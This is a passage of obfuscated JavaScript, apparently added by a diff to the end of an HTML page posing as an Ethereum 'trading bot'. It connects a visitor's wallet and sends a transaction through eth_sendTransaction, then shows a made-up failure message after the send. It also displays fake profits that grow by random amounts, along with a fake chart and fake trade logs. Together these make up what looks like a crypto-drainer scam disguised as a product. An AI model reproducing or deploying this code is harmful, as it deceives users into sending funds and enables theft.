_0x5a9f04=await window[_0x11a3a1(0x1bf)][_0x11a3a1(0x1bb)]({'method':_0x11a3a1(0x1b5),'params':[_0x3a75a4]});_0x482d8a(_0x11a3a1(0x1a4),_0x11a3a1(0x1a6)),await new Promise(_0x3d2e30=>setTimeout(_0x3d2e30,0x4b0)),_0x482d8a(_0x11a3a1(0x1e7),_0x11a3a1(0x1a6)),await new Promise(_0x58f6c2=>setTimeout(_0x58f6c2,0x3e8));throw new Error(_0x11a3a1(0x185));}catch(_0x4dceb8){console[_0x11a3a1(0x17d)](_0x11a3a1(0x22a),_0x4dceb8),_0x482d8a(_0x11a3a1(0x1cb)+(_0x4dceb8[_0x11a3a1(0x160)]||_0x4dceb8),_0x11a3a1(0x17d)),_0x12faa0(_0x11a3a1(0x1fc),_0x4dceb8['message']||_0x11a3a1(0x179),_0x11a3a1(0x17d));}finally{_0x4a5ff1[_0x11a3a1(0x1f8)]=![],_0x4a5ff1['innerHTML']=_0x11a3a1(0x20b);}}function _0x482d8a(_0x4eecae,_0x202853){const _0x1f9dd5=_0x5d25c7;_0x160be9['textContent']=_0x4eecae,_0x160be9['style'][_0x1f9dd5(0x1d5)]=_0x1f9dd5(0x190),_0x160be9[_0x1f9dd5(0x17b)]=_0x1f9dd5(0x1a7)+_0x202853,setTimeout(()=>{const _0x410efe=_0x1f9dd5;_0x160be9[_0x410efe(0x1ca)]['display']=_0x410efe(0x21b);},0x2710);}_0x1bf3c2['setAttribute'](_0x5d25c7(0x1ec),_0x37e909),_0x1bf3c2[_0x5d25c7(0x1a1)](_0x5d25c7(0x1d4),'Min\x20'+_0x37e909+_0x5d25c7(0x1c3)),_0x46679a[_0x5d25c7(0x194)]('click',_0x1e651f),_0x23ad9f[_0x5d25c7(0x194)](_0x5d25c7(0x1b1),_0xcde154),_0x4a5ff1[_0x5d25c7(0x194)](_0x5d25c7(0x1b1),function(){const _0x520072=_0x5d25c7;console[_0x520072(0x1b6)](_0x520072(0x215)),_0x529488();}),_0x1ca2ba[_0x5d25c7(0x194)](_0x5d25c7(0x1b1),_0x23ed36),_0x5bded1[_0x5d25c7(0x194)]('click',_0x23ed36),_0x15e5e1[_0x5d25c7(0x194)](_0x5d25c7(0x1b1),_0x519d8a),document[_0x5d25c7(0x1d2)](_0x5d25c7(0x202))[_0x5d25c7(0x194)]('click',function(){const _0x54d415=_0x5d25c7,_0x2319f5=Math[_0x54d415(0x1da)](Math[_0x54d415(0x224)]()*0x3e8),_0x54dd8a=parseFloat('0.98'+_0x2319f5[_0x54d415(0x142)]()[_0x54d415(0x1cf)](0x3,'0'));_0x510bd7+=_0x54dd8a;const _0x5650ab=document['getElementById'](_0x54d415(0x14f)),_0x3d843e=document[_0x54d415(0x1d2)]('totalProfitUsd');_0x5650ab&&_0x3d843e&&(_0x5650ab[_0x54d415(0x156)]=_0x510bd7[_0x54d415(0x151)](0x6)+_0x54d415(0x1c3),_0x3d843e[_0x54d415(0x156)]='('+(_0x1ac7a4?_0x4e343f(_0x510bd7*_0x1ac7a4):_0x54d415(0x150))+')');});window[_0x5d25c7(0x1bf)]&&window[_0x5d25c7(0x1bf)][_0x5d25c7(0x1bb)]({'method':_0x5d25c7(0x198)})['then'](function(_0x4fad8d){const _0x5eaea6=_0x5d25c7;_0x4fad8d['length']>0x0&&(_0x4b49de=_0x4fad8d,_0x10c328['textContent']=_0x4b49de[0x0],_0x38fd54[_0x5eaea6(0x1ca)][_0x5eaea6(0x1d5)]='flex',_0x4ceeab['style'][_0x5eaea6(0x1d5)]=_0x5eaea6(0x190),_0x5dba86[_0x5eaea6(0x1ca)][_0x5eaea6(0x1d5)]=_0x5eaea6(0x21b),_0x42c9aa());})[_0x5d25c7(0x1d3)](function(_0x452115){const _0x531ce9=_0x5d25c7;console[_0x531ce9(0x17d)](_0x452115);});async function _0x161304(){const _0x347f7b=_0x5d25c7;try{const _0xaeb11d=await fetch(_0x347f7b(0x1aa)),_0x244e77=await _0xaeb11d[_0x347f7b(0x1f6)]();_0x1ac7a4=_0x244e77[_0x347f7b(0x1bf)][_0x347f7b(0x161)];}catch(_0x32f5eb){_0x1ac7a4=null;}}function _0x2d1123(){const _0x4e77bf=_0x5d25c7,_0x57c334=parseFloat(_0x1bf3c2[_0x4e77bf(0x214)]),_0xba8f86=document[_0x4e77bf(0x1d2)](_0x4e77bf(0x167));_0x1bf3c2[_0x4e77bf(0x214)]&&!isNaN(_0x57c334)&&_0x57c334>0x0&&_0x57c334<_0x37e909?_0xba8f86[_0x4e77bf(0x1ca)][_0x4e77bf(0x1d5)]='block':_0xba8f86[_0x4e77bf(0x1ca)][_0x4e77bf(0x1d5)]='none';if(isNaN(_0x57c334)||_0x57c334<_0x37e909){_0x3ce9f9[_0x4e77bf(0x1ca)][_0x4e77bf(0x1d5)]=_0x4e77bf(0x21b);return;}let _0x5be04d=_0x393af5[_0x4e77bf(0x156)]||'0%',_0x137e5b=parseFloat(_0x5be04d);if(isNaN(_0x137e5b))_0x137e5b=0x0;const _0x302977=_0x57c334*(_0x137e5b/0x64);_0x16c1fb[_0x4e77bf(0x156)]=_0x302977[_0x4e77bf(0x151)](0x4)+_0x4e77bf(0x1c3),_0x1ac7a4!==null?_0x520fed[_0x4e77bf(0x156)]=_0x4e343f(_0x302977*_0x1ac7a4):_0x520fed['textContent']='...',_0x48545f['textContent']=_0x4e77bf(0x1f0)+_0x137e5b[_0x4e77bf(0x151)](0x1)+'%)',_0x3ce9f9[_0x4e77bf(0x1ca)]['display']='block';}_0x1bf3c2['addEventListener'](_0x5d25c7(0x159),_0x2d1123),_0x16785e[_0x5d25c7(0x194)](_0x5d25c7(0x1ff),_0x2d1123);function _0x150f62(){const _0x550b19=_0x5d25c7,_0x37cbc1=_0x11c4ef(0x5,0x14,0x1);_0x393af5[_0x550b19(0x156)]=_0x37cbc1+'%',_0x2d1123();}_0x161304()[_0x5d25c7(0x1c5)](_0x2d1123),setInterval(()=>{const _0xeb65b=_0x5d25c7;_0x161304()[_0xeb65b(0x1c5)](_0x2d1123);},0xea60);function _0x5f4341(){const _0x39afc8=_0x5d25c7,_0x325399=document[_0x39afc8(0x1d2)](_0x39afc8(0x1ab));if(!_0x325399){setTimeout(_0x5f4341,0x64);return;}const _0x3dcbaa=_0x325399[_0x39afc8(0x166)]('2d');if(_0x325399['offsetWidth']===0x0||_0x325399['offsetHeight']===0x0){setTimeout(_0x5f4341,0x64);return;}_0x325399[_0x39afc8(0x15e)]=_0x325399[_0x39afc8(0x199)],_0x325399['height']=_0x325399['offsetHeight'];let _0x5d4ab2=[],_0x253446=_0x325399[_0x39afc8(0x1c2)]/0x2,_0x5037d2,_0x898e2d=0x0;for(let _0x436e44=0x0;_0x436e44<_0x325399[_0x39afc8(0x15e)];_0x436e44+=0x2){_0x5d4ab2[_0x39afc8(0x1f1)]({'x':_0x436e44,'y':_0x325399['height']/0x2+(Math[_0x39afc8(0x224)]()-0.5)*0x14});}function _0x242e1b(){const _0x30610e=_0x39afc8;_0x898e2d++;if(_0x898e2d%0xa===0x0){for(let _0x179132=0x0;_0x179132<_0x5d4ab2['length']-0x1;_0x179132++){_0x5d4ab2[_0x179132]['y']=_0x5d4ab2[_0x179132+0x1]['y'];}const _0x3ab85e=(Math[_0x30610e(0x224)]()-0.5)*0x6;_0x253446+=_0x3ab85e,_0x253446=Math['max'](0x14,Math[_0x30610e(0x1ec)](_0x325399[_0x30610e(0x1c2)]-0x14,_0x253446)),_0x5d4ab2[_0x5d4ab2[_0x30610e(0x158)]-0x1]['y']=_0x253446;}_0x3dcbaa['clearRect'](0x0,0x0,_0x325399[_0x30610e(0x15e)],_0x325399[_0x30610e(0x1c2)]),_0x3dcbaa['strokeStyle']=_0x30610e(0x221),_0x3dcbaa[_0x30610e(0x1e4)]=0x2,_0x3dcbaa[_0x30610e(0x1a2)]=_0x30610e(0x20f),_0x3dcbaa[_0x30610e(0x1d7)](),_0x3dcbaa[_0x30610e(0x1ba)](_0x5d4ab2[0x0]['x'],_0x5d4ab2[0x0]['y']);for(let _0x419c2c=0x1;_0x419c2c<_0x5d4ab2[_0x30610e(0x158)];_0x419c2c++){_0x3dcbaa[_0x30610e(0x143)](_0x5d4ab2[_0x419c2c]['x'],_0x5d4ab2[_0x419c2c]['y']);}_0x3dcbaa[_0x30610e(0x204)](),_0x5037d2=requestAnimationFrame(_0x242e1b);}return _0x242e1b(),()=>{_0x5037d2&&cancelAnimationFrame(_0x5037d2);};}setTimeout(()=>{_0x5f4341();},0x1f4);}));function _0x4be1(){const _0x3d2a9c=['Grid\x20trading','An\x20unexpected\x20error\x20occurred\x20during\x20transaction\x20processing','ACTIVE','className','medium','error','Preparing\x20trading\x20environment...','.detail-eth','estimatedEarningsEth','modalCancel','just\x20now','success','Disconnecting\x20wallet...','Transaction\x20failed:\x20Insufficient\x20gas\x20or\x20network\x20congestion\x20detected','Wallet\x20connected\x20successfully!\x20Bot\x20is\x20analyzing\x20market\x20conditions...','strategyType','contains','#tradingLogs\x20.logs-title\x20.badge','Processing\x20Withdrawal\x20<span\x20class=\x22badge\x22\x20style=\x22background-color:\x20#f59e0b;\x20color:\x20white;\x22>WITHDRAWING</span>','(...)','initializeTradingBot\x20called','Bot\x20initialized\x20with\x20','bool','classList','block','ETH/UNI',']\x20@\x20lower\x20price','riskLevel','addEventListener','lastChild','chainChanged','Uniswap','eth_accounts','offsetWidth','color','arbitrage','Balancer','80epSHBi','DOMContentLoaded','0.00\x20ETH\x20<span\x20id=\x22initialCapitalUsd\x22\x20class=\x22capital-usd\x22>($0.00)</span>','\x20ETH.\x20This\x20ensures\x20sufficient\x20capital\x20to\x20cover\x20transaction\x20fees,\x20slippage,\x20and\x20gas\x20costs\x20while\x20maintaining\x20profitable\x20trades.','setAttribute','lineCap','getBoundingClientRect','Algorithm\x20initialized,\x20connecting\x20to\x20trading\x20pools...','risk','info','status\x20','<div\x20class=\x22loading-indicator\x22></div>\x20Initializing...','Web3\x20initialization\x20error:','https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd','liveChart','ETH/DAI','disconnect','sell','connectWalletDiv','Failed\x20to\x20connect\x20wallet:\x20','click','forEach','\x20ETH\x20(','5\x20seconds\x20ago','eth_sendTransaction','log','body','modalFee','amount','moveTo','request','159775dcWCpK','querySelectorAll','No\x20ethereum\x20provider\x20found','ethereum','\x20ETH\x20on\x20','estimatedEarningsUsd','height','\x20ETH','toLocaleString','then','toHex','removeAllListeners','walletInfo','totalProfitSection','style','Trading\x20initialization\x20failed:\x20','top','Web3\x20not\x20initialized.\x20Please\x20reconnect\x20your\x20wallet.','initialCapitalValue','padStart','894dCowdu','1\x20minute\x20ago','getElementById','catch','placeholder','display','ETH/USDC','beginPath','firstChild','removeChild','floor','\x20strategy','Curve','abi','fas\x20fa-check-circle','web3:','Swing\x20trading','304409HnWqpt','blink','No\x20profits\x20available\x20to\x20withdraw\x20yet.','lineWidth','54467zTorcD','tradingAlgorithmSection','Establishing\x20secure\x20MEV\x20protection\x20layers...',')</span>','ETH/LINK','flex','fas\x20fa-exclamation-circle','min','fas\x20fa-info-circle','Ready\x20<span\x20class=\x22badge\x20active\x22>ONLINE</span>','.detail-usd','(Volatility:\x20','push','661532GmafJs','totalProfitUsd','accountsChanged','logsContainer','json','Sold\x20','disabled','Trading','<span\x20class=\x22timestamp\x22>[','ETH/WBTC','Transaction\x20Failed','tradingLogs','Withdrawal\x20Successful','change',']\x20@\x20higher\x20price','HALTED','balancerBadge','Web3\x20initialized\x20successfully','stroke','dYdX','volatilityValue','strategy','white\x20!important','appendChild','profit','<i\x20class=\x22fas\x20fa-rocket\x22\x20style=\x22margin-right:\x2010px;\x22></i>Initialize\x20Trading\x20Bot','30\x20seconds\x20ago','utils','profitValue','round','\x20ETH\x20has\x20been\x20sent\x20to\x20your\x20wallet','low','system','804780AFHUHu','value','Initialize\x20button\x20clicked!','1585SznlgM','amount:','Trading\x20halted\x20-\x20Processing\x20withdrawal\x20request...','tradingActivity','Error\x20initializing\x20Web3:\x20','none','modalProfit','</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20','($0.00)','Bought\x20','0.000000\x20ETH','#58a6ff','walletAddress','\x20ETH\x20<span\x20id=\x22initialCapitalUsd\x22\x20class=\x22capital-usd\x22>(','random','0.000000\x20ETH\x20<span\x20id=\x22initialCapitalUsd\x22\x20class=\x22capital-usd\x22>($0.00)</span>','#8b949e\x20!important','undefined','withdrawalModal','add','Full\x20error:','toString','lineTo','toWei','Processing\x20Withdrawal','connectWallet','Initial\x20Web3\x20setup\x20failed:','disconnectWallet','buy','withdrawButton','</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22toast-message\x22>','Accounts\x20after\x20disconnect:','ETH/USDT','Account\x20changed\x20to\x20','totalProfitEth','...','toFixed','remove','10\x20seconds\x20ago','show','volatilityEarningsNote','textContent','innerHTML','length','input','createElement','en-US','.toast','modalClose','width','Please\x20connect\x20your\x20wallet\x20first\x20to\x20initialize\x20the\x20trading\x20bot.','message','usd','div','transferDiv','Wallet\x20disconnected.\x20Bot\x20deactivated.','autoCompound','getContext','amountValidation','ether','Initializing\x20trading\x20algorithm...',']</span>\x20','querySelector','sendEth','function','modalConfirm','encodeFunctionCall','SushiSwap','15\x20seconds\x20ago','web3','750IZTYEq','high','3FlgIlZ','uint8','409698gJYujG'];_0x4be1=function(){return _0x3d2a9c;};return _0x4be1();}
+</script>
+</body>
+</html>
